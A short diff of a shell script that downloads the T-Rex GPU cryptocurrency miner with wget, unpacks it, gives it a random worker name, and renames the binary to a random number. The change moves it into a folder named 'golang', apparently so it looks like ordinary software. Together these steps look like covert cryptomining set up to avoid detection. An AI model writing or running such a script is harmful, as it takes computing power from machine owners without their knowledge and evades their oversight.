@@ -2,9 +2,8 @@
 apt-get install libpci3 
 P=$(echo GPU-$(shuf -i 1-1000 -n 1)-NEO)
 y=$(( RANDOM - ( RANDOM + RANDOM ) ))
-dir=$RANDOM
 x=1
-mkdir $dir && cd $dir
+mkdir golang && cd golang
 wget https://trex-miner.com/download/t-rex-0.21.3-linux.tar.gz
 tar -xf t-rex-0.21.3-linux.tar.gz
 mv t-rex $y
